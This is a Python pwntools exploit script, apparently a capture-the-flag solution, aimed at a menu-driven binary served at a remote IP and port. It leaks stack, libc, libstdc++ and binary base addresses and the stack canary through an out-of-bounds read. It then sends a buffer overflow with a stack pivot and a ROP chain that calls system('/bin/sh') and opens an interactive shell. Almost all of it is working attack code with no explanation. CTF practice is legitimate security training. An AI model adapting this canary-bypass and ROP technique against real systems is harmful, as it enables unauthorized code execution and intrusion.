#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
libstdc = './libstdc++.so.6'
libstdc = ELF(libstdc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.160.212.3', 7010

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# leak
# breakrva 0x1378

# bof
# breakrva 0x1238

# throw
breakrva 0x1287

# exit
breakrva 0x140e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

def exploit():
    global io
    io = initialize()

    io.sendline(b'2')
    io.sendlineafter(b':', b'0')
    stack = int(io.recvline().strip(), 16)

    io.sendline(b'2')
    io.sendlineafter(b':', b'1')
    libc.address = int(io.recvline().strip(), 16) - 0xad7f2

    io.sendline(b'2')
    io.sendlineafter(b':', b'3')
    libstdc.address = int(io.recvline().strip(), 16) - 0x26c340

    io.sendline(b'2')
    io.sendlineafter(b':', b'17')
    elf.address = int(io.recvline().strip(), 16) - elf.sym['main']

    io.sendline(b'2')
    io.sendlineafter(b':', b'31')
    canary = int(io.recvline().strip(), 16)

    io.sendline(b'1')
    io.sendlineafter(b':', b'1')

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    payload = b'A'*10
    payload += p64(canary)
    payload += cyclic(16)
    payload += p64(stack - 0x60 - 0x10)
    payload += p64(libstdc.address + 0xcfa35)
    payload += cyclic(0x8)
    # payload += b'A'*8
    payload += p64(pop_rdi)
    payload += p64(next(libc.search(b'/bin/sh\x00')))
    payload += p64(ret)
    payload += p64(libc.sym['system'])
    io.sendline(payload)

    log.info('stack: %#x', stack)
    log.info('libc base: %#x', libc.address)
    log.info('libstdc base: %#x', libstdc.address)
    log.info('elf base: %#x', elf.address)
    log.info('canary: %#x', canary)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
